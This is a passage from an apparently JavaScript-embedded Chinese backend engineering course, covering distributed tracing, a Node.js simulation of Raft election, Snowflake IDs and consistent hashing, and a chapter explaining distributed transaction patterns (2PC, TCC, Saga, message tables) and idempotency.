   - OpenTelemetry 统一标准
   - Span：一次操作；Trace：一棵 Span 树
   - 关键字段：traceId、spanId、parentSpanId、operationName、tags、logs

**采样策略**：
- 头部采样：入口决定是否采样，简单但可能漏掉慢请求
- 尾部采样：根据响应结果（如错误/慢请求）决定，精准但需缓存全链路
- 概率采样：按比例（如 1%）随机采样

**多语言对照**：

Java：Micrometer + Sleuth + Zipkin
Go：OpenTelemetry SDK + Jaeger
Python：OpenTelemetry + Jaeger
Node.js：@opentelemetry/api + @opentelemetry/sdk-trace-node

**黄金信号（Google SRE）**：延迟、流量、错误、饱和度。监控这四个维度即可覆盖大部分系统健康度。

---

> 下一章我们将深入分布式事务，解决跨服务数据一致性难题。`,
    code: `// ============================================================
// 分布式系统基础 —— Raft 选举 + 雪花算法 + 一致性哈希 模拟
// ============================================================

const crypto = require('crypto');

// ---------- 1. Raft Leader 选举模拟 ----------
class RaftNode {
  constructor(id, peers) {
    this.id = id;
    this.peers = peers;              // 其他节点
    this.state = 'Follower';         // Follower / Candidate / Leader
    this.currentTerm = 0;
    this.votedFor = null;            // 本任期投给谁
    this.votesReceived = new Set();  // 收到的选票
    this.electionTimeout = this.randomTimeout(); // 随机选举超时
    this.lastHeartbeat = Date.now();
    this.leaderId = null;
  }

  // 随机选举超时（150-300ms，避免同时竞选）
  randomTimeout() {
    return 150 + Math.floor(Math.random() * 150);
  }

  // 检查是否选举超时
  checkElectionTimeout() {
    if (this.state === 'Leader') return;
    if (Date.now() - this.lastHeartbeat > this.electionTimeout) {
      this.startElection();
    }
  }

  // 发起选举
  startElection() {
    this.state = 'Candidate';
    this.currentTerm++;
    this.votedFor = this.id;
    this.votesReceived = new Set([this.id]);
    this.lastHeartbeat = Date.now();
    this.electionTimeout = this.randomTimeout();
    console.log(\`[节点\${this.id}] 发起选举，任期=\${this.currentTerm}\`);

    // 向其他节点请求投票
    for (const peer of this.peers) {
      const granted = peer.handleRequestVote(this.currentTerm, this.id);
      if (granted) {
        this.votesReceived.add(peer.id);
      }
    }

    // 判断是否获得多数票
    const majority = Math.floor((this.peers.length + 1) / 2) + 1;
    if (this.votesReceived.size >= majority && this.state === 'Candidate') {
      this.becomeLeader();
    }
  }

  // 处理投票请求
  handleRequestVote(term, candidateId) {
    // 发现更高任期，降级为 Follower
    if (term > this.currentTerm) {
      this.currentTerm = term;
      this.state = 'Follower';
      this.votedFor = null;
    }
    // 投票条件：任期 >= 自己，且本任期没投过票
    if (term >= this.currentTerm && (this.votedFor === null || this.votedFor === candidateId)) {
      this.votedFor = candidateId;
      this.lastHeartbeat = Date.now(); // 重置计时
      return true;
    }
    return false;
  }

  // 成为 Leader
  becomeLeader() {
    this.state = 'Leader';
    this.leaderId = this.id;
    console.log(\`[节点\${this.id}] 当选 Leader！任期=\${this.currentTerm}，票数=\${this.votesReceived.size}\`);
  }

  // Leader 发心跳
  sendHeartbeat() {
    if (this.state !== 'Leader') return;
    for (const peer of this.peers) {
      peer.handleHeartbeat(this.currentTerm, this.id);
    }
  }

  // 处理心跳
  handleHeartbeat(term, leaderId) {
    if (term >= this.currentTerm) {
      this.currentTerm = term;
      this.state = 'Follower';
      this.leaderId = leaderId;
      this.lastHeartbeat = Date.now();
    }
  }
}

// 模拟 Raft 选举
function simulateRaftElection() {
  console.log('========== Raft Leader 选举模拟 ==========');
  const node1 = new RaftNode(1, []);
  const node2 = new RaftNode(2, []);
  const node3 = new RaftNode(3, []);
  // 互相设为 peer
  node1.peers = [node2, node3];
  node2.peers = [node1, node3];
  node3.peers = [node1, node2];

  console.log('3 节点集群启动，初始都是 Follower');
  // 节点1 最先超时，发起选举
  console.log('\\n--- 节点1 选举超时，发起选举 ---');
  node1.startElection();
  console.log(\`  最终状态: 节点1=\${node1.state}, 节点2=\${node2.state}, 节点3=\${node3.state}\`);

  // 模拟 Leader 宕机，重新选举
  console.log('\\n--- Leader(节点1) 宕机，重新选举 ---');
  node1.state = 'Follower'; // 模拟宕机
  node1.currentTerm = 0;
  node2.lastHeartbeat = 0; // 节点2 先超时
  node2.startElection();
  console.log(\`  最终状态: 节点1=\${node1.state}, 节点2=\${node2.state}, 节点3=\${node3.state}\`);
  console.log('');
}

// ---------- 2. 雪花算法（Snowflake） ----------
class SnowflakeId {
  constructor(machineId) {
    this.machineId = machineId & 0x3FF;   // 10 bit 机器 ID（1024 台）
    this.epoch = 1704067200000;           // 起始时间戳（2024-01-01）
    this.sequence = 0;
    this.lastTimestamp = -1;
  }

  // 生成 ID
  nextId() {
    let now = Date.now();
    // 时钟回拨处理
    if (now < this.lastTimestamp) {
      const diff = this.lastTimestamp - now;
      if (diff <= 5) {
        // 小回拨，等待
        now = this.lastTimestamp;
      } else {
        throw new Error(\`时钟回拨 \${diff}ms，拒绝生成\`);
      }
    }
    if (now === this.lastTimestamp) {
      this.sequence = (this.sequence + 1) & 0xFFF; // 12 bit 序列号
      if (this.sequence === 0) {
        // 序列号用尽，等下一毫秒
        while (Date.now() <= now) { /* spin */ }
        now = Date.now();
      }
    } else {
      this.sequence = 0;
    }
    this.lastTimestamp = now;
    // 组装：41bit时间 | 10bit机器 | 12bit序列
    const ts = BigInt(now - this.epoch);
    const id = (ts << 22n) | (BigInt(this.machineId) << 12n) | BigInt(this.sequence);
    return id;
  }

  // 解析 ID（调试用）
  parse(id) {
    const bi = BigInt(id);
    const ts = Number(bi >> 22n) + this.epoch;
    const machine = Number((bi >> 12n) & 0x3FFn);
    const seq = Number(bi & 0xFFFn);
    return { timestamp: ts, machineId: machine, sequence: seq, date: new Date(ts).toISOString() };
  }
}

function simulateSnowflake() {
  console.log('========== 雪花算法 ID 生成 ==========');
  const snow = new SnowflakeId(1);
  console.log('机器 ID=1，生成 5 个 ID：');
  for (let i = 0; i < 5; i++) {
    const id = snow.nextId();
    console.log(\`  ID\${i+1}: \${id.toString()} → \${JSON.stringify(snow.parse(id))}\`);
  }
  // 不同机器
  const snow2 = new SnowflakeId(2);
  console.log('机器 ID=2，生成 3 个 ID：');
  for (let i = 0; i < 3; i++) {
    console.log(\`  ID: \${snow2.nextId().toString()}\`);
  }
  console.log('');
}

// ---------- 3. 一致性哈希 ----------
class ConsistentHash {
  constructor(virtualNodes = 150) {
    this.virtualNodes = virtualNodes;
    this.ring = new Map();  // hashValue -> 物理节点名
    this.sortedHashes = []; // 排序的哈希值
  }

  hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
    return Math.abs(h);
  }

  // 添加节点
  addNode(node) {
    for (let i = 0; i < this.virtualNodes; i++) {
      const vNode = \`\${node}#\${i}\`;
      const h = this.hash(vNode);
      this.ring.set(h, node);
      this.sortedHashes.push(h);
    }
    this.sortedHashes.sort((a, b) => a - b);
    console.log(\`[一致性哈希] 添加节点 \${node}（\${this.virtualNodes} 个虚拟节点）\`);
  }

  // 移除节点
  removeNode(node) {
    const toRemove = [];
    for (const [h, n] of this.ring) {
      if (n === node) toRemove.push(h);
    }
    toRemove.forEach(h => { this.ring.delete(h); });
    this.sortedHashes = this.sortedHashes.filter(h => !toRemove.includes(h));
    console.log(\`[一致性哈希] 移除节点 \${node}\`);
  }

  // 路由 key 到节点
  getNode(key) {
    if (this.sortedHashes.length === 0) return null;
    const h = this.hash(key);
    // 二分查找第一个 >= h 的位置
    let lo = 0, hi = this.sortedHashes.length;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if (this.sortedHashes[mid] < h) lo = mid + 1;
      else hi = mid;
    }
    const idx = lo % this.sortedHashes.length;
    return this.ring.get(this.sortedHashes[idx]);
  }

  // 统计各节点数据分布
  distribution(keys) {
    const dist = {};
    for (const k of keys) {
      const n = this.getNode(k);
      dist[n] = (dist[n] || 0) + 1;
    }
    return dist;
  }
}

function simulateConsistentHash() {
  console.log('========== 一致性哈希 ==========');
  const ch = new ConsistentHash(150);
  ch.addNode('Node-A');
  ch.addNode('Node-B');
  ch.addNode('Node-C');

  const keys = Array.from({ length: 1000 }, (_, i) => \`key-\${i}\`);
  console.log('\\n3 节点数据分布（1000 个 key）：');
  console.log(ch.distribution(keys));

  // 添加节点，看迁移量
  console.log('\\n--- 添加节点 Node-D ---');
  const before = {};
  keys.forEach(k => { const n = ch.getNode(k); before[k] = n; });
  ch.addNode('Node-D');
  let migrated = 0;
  keys.forEach(k => {
    const n = ch.getNode(k);
    if (n !== before[k]) migrated++;
  });
  console.log(\`迁移量: \${migrated}/1000（约 \${(migrated/10).toFixed(1)}%）\`);
  console.log('4 节点数据分布：', ch.distribution(keys));

  // 移除节点
  console.log('\\n--- 移除节点 Node-B ---');
  const before2 = {};
  keys.forEach(k => { const n = ch.getNode(k); before2[k] = n; });
  ch.removeNode('Node-B');
  migrated = 0;
  keys.forEach(k => {
    const n = ch.getNode(k);
    if (n !== before2[k]) migrated++;
  });
  console.log(\`迁移量: \${migrated}/1000\`);
  console.log('3 节点数据分布：', ch.distribution(keys));
  console.log('\\n=== 全部演示完成 ===');
}

// 运行所有模拟
simulateRaftElection();
simulateSnowflake();
simulateConsistentHash();
`,
  },

  // =========================================================
  // 第四章：分布式事务
  // =========================================================
  {
    id: "backend-distributed-tx",
    group: "分布式与工程化",
    icon: "🔄",
    title: "分布式事务",
    content: `## 分布式事务

**分布式事务** 是指跨多个服务、多个数据库的事务操作，需要保证这些操作要么全部成功，要么全部回滚。在微服务架构中，一个业务操作往往涉及多个服务和多个数据库（如下单要写订单库、扣库存库、扣余额库），单机的 ACID 事务无法覆盖跨服务场景，分布式事务成为必须解决的难题。

本章将从分布式事务的根本问题出发，深入讲解 2PC、3PC、TCC、Saga、本地消息表、事务消息、最大努力通知等主流方案，最后给出选型决策和实战案例。

### 一、分布式事务的难题

#### 1.1 单机 ACID 在分布式下的失效

**ACID** 是单机事务的四大特性：

- **A（Atomicity 原子性）**：事务内操作要么全成功，要么全回滚。
- **C（Consistency 一致性）**：事务前后数据一致。
- **I（Isolation 隔离性）**：并发事务互不干扰。
- **D（Durability 持久性）**：提交后永久保存。

单机事务靠数据库的"redo log + undo log + 锁"实现 ACID。但跨服务时：

\`\`\`
下单操作跨 3 个服务：
  订单服务 → 写订单库（order-db）
  库存服务 → 扣库存库（stock-db）
  账户服务 → 扣余额库（account-db）

  三个库在不同服务、不同数据库 → 无法用一个本地事务覆盖
  → 订单写成功，库存扣成功，余额扣失败 → 数据不一致！
\`\`\`

**核心难题**：跨库/跨服务时，无法用一个事务保证原子性。网络不可靠、服务可能故障，导致部分成功部分失败。

#### 1.2 分布式事务的挑战

\`\`\`
挑战1：网络不可靠
  订单服务调用库存服务 → 网络超时 → 不知道成功还是失败？
  → 重试？可能重复扣库存
  → 不重试？可能库存没扣

挑战2：部分失败
  订单成功、库存成功、余额失败
  → 如何回滚已成功的订单和库存？

挑战3：性能损耗
  跨服务事务要协调多个节点 → 延迟增加、吞吐下降
  → 强一致方案（2PC）性能差

挑战4：一致性 vs 可用性
  CAP 理论：分区时不能同时保证 C 和 A
  → 强一致牺牲可用性，高可用牺牲一致性
\`\`\`

#### 1.3 分布式事务的本质

分布式事务的本质是：**在不可靠网络上，协调多个节点达成一致**。没有完美方案，只有权衡：

- **强一致**（2PC/XA）：保证一致，但性能差、可用性低。
- **最终一致**（消息表/Saga）：放弃强一致，性能好、可用性高，但需要补偿和幂等。

> 生产实践中，**最终一致是主流选择**，强一致只在金融等核心场景用。

---

### 二、CAP 与 BASE 理论回顾

#### 2.1 CAP 在事务中的体现

\`\`\`
跨 3 个服务的事务：
  分区时：
    CP：拒绝执行（保一致，牺牲可用）→ 2PC/XA
    AP：各自执行，事后修复（保可用，牺牲一致）→ Saga/消息表
\`\`\`

#### 2.2 BASE 理论

BASE 是对 CAP 中 AP 的实践指导：

- **B（Basically Available 基本可用）**：系统在故障时允许损失部分可用性（如响应变慢、降级）。
- **S（Soft State 软状态）**：允许数据存在中间状态（如"处理中"），不要求时刻一致。
- **E（Eventually Consistent 最终一致）**：系统保证最终数据一致，但不保证实时一致。

\`\`\`
BASE 的事务观：
  下单 → 订单"处理中"（软状态）→ 库存扣减、余额扣减异步执行
       → 最终全部成功 → 订单"已完成"（最终一致）

  不是强一致（中间有不一致窗口），但最终一致 + 系统高可用
\`\`\`

**BASE 是分布式事务的理论基础**：大多数分布式事务方案（Saga/消息表/TCC）都遵循 BASE，实现最终一致。

---

### 三、两阶段提交（2PC）

2PC（Two-Phase Commit）是最经典的分布式事务方案，强一致但性能差。

#### 3.1 2PC 的两个阶段

\`\`\`
角色：
  协调者（Coordinator）：统一调度事务
  参与者（Participant）：执行实际操作（各服务的数据库）

阶段1：Prepare（准备/投票）
  协调者 → 所有参与者："准备好了吗？"
  参与者 → 执行操作（但不提交）→ 锁定资源 → 回复 YES/NO

  协调者收到：
    全部 YES → 进入阶段2
    任一 NO  → 中止，发 Rollback 给所有人

阶段2：Commit/Rollback（提交/回滚）
  协调者 → 所有参与者："Commit！"（或 "Rollback！"）
  参与者 → 提交（或回滚）→ 释放资源 → 回复 ACK
\`\`\`

#### 3.2 2PC 的流程图

\`\`\`
      协调者                        参与者A    参与者B    参与者C
        │                              │         │         │
   Prepare│─────────────────────────→│         │         │
        │←─────────YES/NO─────────────│         │         │
        │←─────────YES/NO──────────────────────│         │
        │←─────────YES/NO────────────────────────────────│
        │                              │         │         │
   全部YES?                              │         │         │
     是 → Commit                          │         │         │
     否 → Rollback                        │         │         │
        │────────Commit/Rollback────→│         │         │
        │←─────────ACK───────────────│         │         │
\`\`\`

#### 3.3 2PC 的问题

**问题1：同步阻塞**

Prepare 阶段，参与者锁定资源（如行锁），直到 Commit/Rollback 才释放。期间所有访问该资源的请求阻塞。

\`\`\`
参与者A 锁定了订单行（Prepare）→ 等协调者发 Commit
  期间任何人查/改订单都阻塞
  → 协调者慢一点，整个系统卡住
\`\`\`

**问题2：协调者单点**

协调者挂了，参与者一直锁定资源，不知道该提交还是回滚。

\`\`\`
协调者在 Prepare 后、Commit 前崩溃
  → 参与者锁定资源等待 → 无法提交也无法回滚 → 死锁
  → 必须等协调者恢复（可能几分钟）
\`\`\`

**问题3：数据不一致**

Commit 阶段，部分参与者收到 Commit，部分没收到（网络问题）：

\`\`\`
协调者发 Commit → A 收到并提交 → B 没收到（网络丢包）→ B 还在锁定
  → A 已提交，B 未提交 → 数据不一致
\`\`\`

**问题4：性能差**

两阶段 + 资源锁定 + 网络往返 → 延迟高、吞吐低。不适合高并发场景。

#### 3.4 2PC 的适用场景

- 强一致要求（如银行核心账务）。
- 参与者少（2-3 个）。
- 对性能不敏感。
- 有 XA 协议支持的数据库（MySQL XA、Oracle XA）。

**多语言对照（XA 事务）**：

Java (JTA + Seata XA):
\`\`\`java
@Transactional
public void createOrder() {
    orderDao.insert(order);       // order-db
    stockDao.deduct(itemId);      // stock-db（XA 资源）
    accountDao.deduct(userId);    // account-db（XA 资源）
    // Seata 自动协调 2PC
}
\`\`\`

---

### 四、三阶段提交（3PC）

3PC 在 2PC 基础上增加了一个阶段，引入超时机制，缓解部分问题。

#### 4.1 3PC 的三个阶段

\`\`\`
阶段1：CanCommit（询问）
  协调者 → 参与者："你能执行事务吗？"
  参与者 → 检查（不锁定资源）→ YES/NO

阶段2：PreCommit（预提交）
  协调者 → 全部YES → "PreCommit"
  参与者 → 执行操作（锁定资源）→ 回复 ACK
  → 引入超时：参与者超时未收到 DoCommit → 自动提交

阶段3：DoCommit（最终提交）
  协调者 → "DoCommit"
  参与者 → 提交 → 释放资源
\`\`\`

#### 4.2 3PC 的改进

- **引入超时**：参与者超时后可自行决策（PreCommit 超时自动提交），减少协调者单点阻塞。
- **CanCommit 预检查**：提前发现问题，减少不必要的资源锁定。

#### 4.3 3PC 仍有的问题

- **数据不一致仍可能**：PreCommit 后协调者崩溃，部分参与者超时提交，部分未超时 → 不一致。
- **性能更差**：三个阶段比两个阶段更多网络往返。
- **实际很少用**：改进有限，复杂度增加，生产中极少使用。

---

### 五、TCC（Try-Confirm-Cancel）

TCC 是业务层面的两阶段提交，由 Try、Confirm、Cancel 三个操作组成。

#### 5.1 TCC 的三个操作

\`\`\`
Try（尝试）：预留资源
  - 检查并冻结资源，不真正执行
  - 例：扣余额 → 冻结 100 元（余额 -100，冻结 +100）

Confirm（确认）：确认执行
  - Try 全部成功后，真正执行
  - 例：冻结的 100 元正式扣除（冻结 -100）

Cancel（取消）：释放资源
  - 任一 Try 失败，回滚所有 Try
  - 例：冻结的 100 元退回余额（冻结 -100，余额 +100）
\`\`\`

#### 5.2 TCC 的流程

\`\`\`
下单（TCC）：
  Try 阶段：
    订单服务：创建订单（状态"待确认"）
    库存服务：冻结库存（可用 -1，冻结 +1）
    账户服务：冻结余额（余额 -100，冻结 +100）
    → 全部 Try 成功 → 进入 Confirm

  Confirm 阶段：
    订单服务：订单状态改"已确认"
    库存服务：冻结库存正式扣除（冻结 -1）
    账户服务：冻结余额正式扣除（冻结 -100）
    → 全部 Confirm → 事务完成

  Cancel 阶段（任一 Try 失败时）：
    订单服务：订单状态改"已取消"
    库存服务：冻结库存退回（冻结 -1，可用 +1）
    账户服务：冻结余额退回（冻结 -100，余额 +100）
\`\`\`

#### 5.3 TCC 的四大问题

**问题1：业务侵入**

TCC 要求每个操作实现三个方法（Try/Confirm/Cancel），业务逻辑复杂。

\`\`\`
普通扣库存：deduct(amount)
TCC 扣库存：
  tryDeduct(amount)      // 冻结
  confirmDeduct(amount)  // 确认
  cancelDeduct(amount)   // 解冻
→ 代码量 3 倍
\`\`\`

**问题2：幂等性**

Confirm 和 Cancel 可能被重试（网络问题），必须幂等。

\`\`\`
Confirm 发送 → 网络超时 → 重试 → 参与者收到两次
  → 第二次必须幂等（已确认则跳过）
\`\`\`

**问题3：空回滚**

Try 未执行但 Cancel 被调用（Try 超时，协调者直接 Cancel）：

\`\`\`
Try 发出但未到达参与者 → 协调者超时 → 发 Cancel
  → 参与者收到 Cancel 但没 Try 记录 → 空回滚
  → Cancel 要处理"没有 Try 记录"的情况
\`\`\`

**问题4：悬挂**

Cancel 先于 Try 到达（网络延迟）：

\`\`\`
Try 发出 → 网络延迟 → 协调者超时发 Cancel → Cancel 到达 → Try 后到达
  → Cancel 已执行（释放了不存在的资源），Try 又执行（预留资源）
  → 资源悬挂（Try 预留了但永远不会 Confirm/Cancel）
  → 需要记录"已 Cancel"，后续 Try 拒绝
\`\`\`

#### 5.4 TCC 的适用场景

- 强一致要求（如资金扣减）。
- 业务能接受三方法改造。
- 对性能有要求（比 2PC 好，资源锁定时间短）。

**多语言对照（Seata TCC）**：

Java (Seata TCC):
\`\`\`java
@LocalTCC
public interface AccountTccAction {
    @TwoPhaseBusinessAction(name = "deduct", commitMethod = "confirm", rollbackMethod = "cancel")
    boolean tryDeduct(BusinessActionContext ctx, @BusinessActionContextParameter(paramName = "amount") BigDecimal amount);

    boolean confirm(BusinessActionContext ctx);
    boolean cancel(BusinessActionContext ctx);
}
\`\`\`

---

### 六、Saga 长事务

Saga 将长事务拆成一系列本地事务，每个有补偿操作，失败时反向补偿。

#### 6.1 Saga 的模型

\`\`\`
Saga = T1, T2, ..., Tn（正向事务序列）
     + C1, C2, ..., Cn（补偿事务序列）

执行流程：
  T1 → T2 → T3 → ... → Tn（全成功 → 事务完成）

  若 Tk 失败：
  → 执行 C(k-1), C(k-2), ..., C1（反向补偿已成功的）
  → 最终所有已执行的事务都被补偿回滚
\`\`\`

#### 6.2 Saga 示例：旅行预订

\`\`\`
旅行预订 Saga：
  T1: 预订机票（扣减机票库存）→ C1: 取消机票（恢复库存）
  T2: 预订酒店（锁定房间）→ C2: 取消酒店（释放房间）
  T3: 租车（锁定车辆）→ C3: 取消租车（释放车辆）

执行：
  T1 成功 → T2 成功 → T3 失败
  → 补偿：C2（取消酒店）→ C1（取消机票）
  → 最终：机票、酒店、租车都未预订
\`\`\`

#### 6.3 Saga 的两种实现

**编排式（Choreography）**：无中心协调者，各服务监听事件，自行决定下一步。

\`\`\`
订单服务 → 发"订单创建"事件
  ↓
库存服务消费 → 扣库存 → 发"库存扣减成功"事件
  ↓
账户服务消费 → 扣余额 → 发"余额扣减成功"事件
  ↓
订单服务消费 → 订单完成

任一失败 → 发失败事件 → 各服务监听并补偿
\`\`\`

优点：去中心化、松耦合。
缺点：流程不直观、调试难、循环依赖风险。

**协调式（Orchestration）**：有中心协调者，统一调度。

\`\`\`
Saga 协调者：
  → 调库存服务扣库存（T1）
  → 调账户服务扣余额（T2）
  → 调支付服务支付（T3）
  T3 失败 → 调账户服务退余额（C2）→ 调库存服务回库存（C1）
\`\`\`

优点：流程清晰、易管理、易调试。
缺点：协调者单点、耦合度高。

#### 6.4 Saga 的问题

- **补偿不是回滚**：补偿是"业务层面的反向操作"，不是数据库回滚。如"已发货"的补偿是"召回"，不是"没发货"。
- **中间状态可见**：Saga 执行过程中，部分事务已提交，外部能看到中间状态。
- **不保证隔离性**：并发 Saga 可能互相影响（脏读、丢失更新）。
- **补偿难写**：有些操作难以补偿（如"已发短信"无法撤回）。

#### 6.5 Saga 适用场景

- 长流程业务（如旅行预订、订单履约）。
- 涉及多个服务、多个步骤。
- 能接受最终一致。
- 业务操作可补偿。

---

### 七、本地消息表

本地消息表是最常用的最终一致方案，简单可靠。

#### 7.1 本地消息表的原理

\`\`\`
核心思想：业务操作和消息记录在同一个本地事务中，保证原子性
  → 后台扫描消息表，投递到 MQ → 消费者处理

表结构：
  业务表（orders）：order_id, status, ...
  消息表（local_messages）：msg_id, topic, payload, status(待发送/已发送), retry_count

下单流程：
  BEGIN TRANSACTION
    INSERT INTO orders(...)           -- 业务操作
    INSERT INTO local_messages(...)   -- 记录消息（同事务）
  COMMIT
  → 业务和消息要么都成功，要么都失败（原子性）

后台扫描：
  定时扫描 local_messages WHERE status='待发送'
  → 投递到 MQ → 成功则更新 status='已发送'
  → 失败则 retry_count++，重试

消费者：
  消费 MQ 消息 → 执行业务 → 幂等处理
\`\`\`

#### 7.2 本地消息表的流程图

\`\`\`
订单服务                     MQ                    库存服务
   │                         │                        │
   ├── 写订单+消息(同事务)──→│                        │
   │                         │                        │
   ├── 后台扫描消息表 ──→ 投递到MQ ──→│                │
   │                         │──→ 消费 → 扣库存 ──→│
   │                         │←── ack ──────────────│
   │←── 更新消息状态=已发送 ──│                        │
\`\`\`

#### 7.3 本地消息表的优点

- **简单可靠**：不需要 2PC/TCC 的复杂协调，只靠本地事务 + 定时扫描。
- **最终一致**：消息一定会投递（重试机制），消费端幂等保证不重复。
- **解耦**：通过 MQ 解耦生产者和消费者。

#### 7.4 本地消息表的缺点

- **消息延迟**：定时扫描有间隔（如 1 秒），消息不是实时投递。
- **需要消息表**：每个生产者服务都要建消息表，有一定维护成本。
- **消费端必须幂等**：消息可能重复投递（重试导致）。

#### 7.5 多语言对照

Java (Spring + 本地消息表):
\`\`\`java
@Transactional
public void createOrder(Order order) {
    orderDao.insert(order);                          // 业务
    messageDao.insert(new Message("order.created",   // 消息
        JSON.toJson(order)));
}

// 定时扫描
@Scheduled(fixedDelay = 1000)
public void sendMessages() {
    List<Message> pending = messageDao.findPending();
    for (Message msg : pending) {
        kafkaTemplate.send(msg.getTopic(), msg.getPayload());
        messageDao.markSent(msg.getId());
    }
}
\`\`\`

Go (本地消息表):
\`\`\`go
func CreateOrder(tx *sql.Tx, order Order) error {
    tx.Exec("INSERT INTO orders(...) VALUES(...)", ...)
    tx.Exec("INSERT INTO local_messages(topic, payload) VALUES(?, ?)",
        "order.created", toJson(order))
    return tx.Commit()
}
\`\`\`

---

### 八、事务消息（RocketMQ）

事务消息是 RocketMQ 提供的"半消息"机制，保证业务操作与消息发送的原子性，比本地消息表更优雅。

#### 8.1 事务消息的原理

\`\`\`
半消息（Half Message）：发送后暂不可见，等业务确认后才对消费者可见

流程：
  1. 生产者发送半消息到 RocketMQ（消费者看不到）
  2. 半消息发送成功 → 执行本地事务（写订单）
  3. 本地事务执行完 → 通知 RocketMQ 提交/回滚半消息
    提交 → 半消息变正常消息 → 消费者可消费
    回滚 → 半消息删除 → 消费者看不到
  4. 如果生产者宕机（没通知提交/回滚）→ RocketMQ 回查生产者"事务状态？"
\`\`\`

#### 8.2 事务消息的流程图

\`\`\`
生产者                  RocketMQ               消费者
  │                        │                      │
  ├── 1.发送半消息 ──→     │                      │
  │←── 2.半消息发送成功 ──│                      │
  │                        │（半消息暂不可见）       │
  ├── 3.执行本地事务        │                      │
  │                        │                      │
  ├── 4.提交/回滚 ──→      │                      │
  │                        │                      │
  │                    提交→5.消息可见 ──→ 消费 →  │
  │                    回滚→5.删除消息             │
  │                        │                      │
  │  （宕机未通知）          │                      │
  │←──── 6.回查事务状态 ────│                      │
  ├──→ 返回提交/回滚 ──→    │                      │
\`\`\`

#### 8.3 事务消息 vs 本地消息表

| 维度 | 本地消息表 | 事务消息 |
|------|-----------|---------|
| 原子性保证 | 业务+消息同事务 | 半消息+本地事务+回查 |
| 消息表 | 需要 | 不需要 |
| 实时性 | 定时扫描有延迟 | 实时（提交即可见） |
| 依赖 | MQ+数据库 | RocketMQ |
| 复杂度 | 低 | 中（需实现回查） |

#### 8.4 事务消息的多语言对照

Java (RocketMQ):
\`\`\`java
TransactionMQProducer producer = new TransactionMQProducer("group");
producer.setTransactionListener(new TransactionListener() {
    public LocalTransactionState executeLocalTransaction(Message msg, Object arg) {
        // 执行本地事务
        try {
            orderDao.insert(order);
            return LocalTransactionState.COMMIT_MESSAGE;
        } catch (Exception e) {
            return LocalTransactionState.ROLLBACK_MESSAGE;
        }
    }
    public LocalTransactionState checkLocalTransaction(MessageExt msg) {
        // 回查：查本地事务是否成功
        Order order = orderDao.findById(extractId(msg));
        return order != null ? COMMIT_MESSAGE : ROLLBACK_MESSAGE;
    }
});
producer.sendMessageInTransaction(msg, null);
\`\`\`

---

### 九、最大努力通知

最大努力通知适用于"尽力通知，不保证一定到达"的场景，如支付回调。

#### 9.1 最大努力通知的原理

\`\`\`
支付场景：
  支付平台 → 支付成功 → 通知商户（调用商户回调 URL）
    → 通知失败 → 重试（1次/5次/10次，递增间隔）
    → 多次失败 → 放弃（商户可主动查询）

特点：
  - 不保证一定通知到（最大努力）
  - 有重试机制（递增间隔）
  - 消费端需提供"主动查询"接口（兜底）
  - 通知结果有记录（可对账）
\`\`\`

#### 9.2 最大努力通知 vs 本地消息表

| 维度 | 最大努力通知 | 本地消息表 |
|------|------------|-----------|
| 方向 | A→B（A通知B） | A→B（A发消息，B消费） |
| 可靠性 | 尽力，不保证 | 保证最终送达 |
| 重试 | 有限次（如10次） | 无限重试 |
| 兜底 | 主动查询 | 无 |
| 场景 | 跨系统通知（支付回调） | 内部服务间 |

#### 9.3 适用场景

- 支付结果回调（支付宝/微信通知商户）。
- 第三方服务通知（短信、物流状态）。
- 对一致性要求不高、有主动查询兜底的场景。

---

### 十、各方案对比与决策

#### 10.1 方案全面对比

| 方案 | 一致性 | 性能 | 复杂度 | 业务侵入 | 适用场景 |
|------|--------|------|--------|---------|---------|
| 2PC | 强一致 | 差 | 中 | 低 | 银行核心 |
| 3PC | 强一致 | 更差 | 高 | 低 | 极少用 |
| TCC | 强一致 | 中 | 高 | 高（三方法） | 资金扣减 |
| Saga | 最终一致 | 好 | 中 | 中（补偿） | 长流程 |
| 本地消息表 | 最终一致 | 好 | 低 | 低 | 通用 |
| 事务消息 | 最终一致 | 好 | 中 | 中 | RocketMQ生态 |
| 最大努力通知 | 弱 | 好 | 低 | 低 | 支付回调 |

#### 10.2 选型决策树

\`\`\`
需要强一致吗？
  是 → 参与者少吗？
        是 → 2PC/XA
        否 → 能改造业务吗？
              能 → TCC
              否 → 考虑业务能否接受最终一致
  否（最终一致即可）→
    是长流程吗？
      是 → Saga
      否 → 有 RocketMQ 吗？
            是 → 事务消息
            否 → 本地消息表
    只是通知？→ 最大努力通知
\`\`\`

#### 10.3 生产实践建议

- **默认选本地消息表**：简单、可靠、通用，90% 的场景够用。
- **金融核心用 TCC**：资金操作要求强一致，能接受业务改造。
- **长流程用 Saga**：涉及多步骤、多服务，如订单履约。
- **RocketMQ 用户用事务消息**：比本地消息表更优雅。
- **2PC/XA 慎用**：性能差，只在强一致+少参与者场景用。

---

### 十一、幂等性在分布式事务中的关键作用

幂等性是分布式事务的基石——没有幂等，所有方案都会因重试而崩溃。

#### 11.1 为什么分布式事务必须幂等

\`\`\`
分布式事务中，重试是常态：
  - 2PC：协调者重发 Commit
  - TCC：Confirm/Cancel 可能重发
  - Saga：补偿操作可能重发
  - 本地消息表：消息可能重复投递
  - 事务消息：回查后可能重复执行

→ 如果操作不幂等，重试会导致数据错误
  扣 100 元重试 2 次 → 扣了 200 元！
\`\`\`

#### 11.2 幂等实现方案

**方案1：唯一请求 ID（幂等键）**

\`\`\`
客户端每次请求带唯一 requestId
  服务端用 requestId 去重：
    第一次 → 执行 → 记录 requestId
    重复 → 查到已执行 → 返回上次结果
\`\`\`

**方案2：状态机**

\`\`\`
订单状态：待支付 → 已支付 → 已发货
  "支付"操作：只有"待支付"才能执行
  重复支付请求 → 检查状态已是"已支付" → 幂等返回
\`\`\`

**方案3：数据库唯一约束**

\`\`\`
扣款操作用 INSERT 而非 UPDATE：
  INSERT INTO deductions(id, order_id, amount) VALUES(...)
  → 重复 INSERT → 主键冲突 → 幂等失败（跳过）
\`\`\`

**方案4：乐观锁版本号**

\`\`\`
UPDATE account SET balance = balance - 100, version = version + 1
WHERE user_id = ? AND version = ?
  → 重复执行 → version 已变 → 更新 0 行 → 幂等
\`\`\`

#### 11.3 幂等性设计要点

\`\`\`
[ ] 每个操作有唯一标识（requestId/事务ID）
[ ] 服务端记录已处理的操作
[ ] 重复请求返回上次结果（而非报错）
[ ] 涉及状态变更的操作用状态机控制
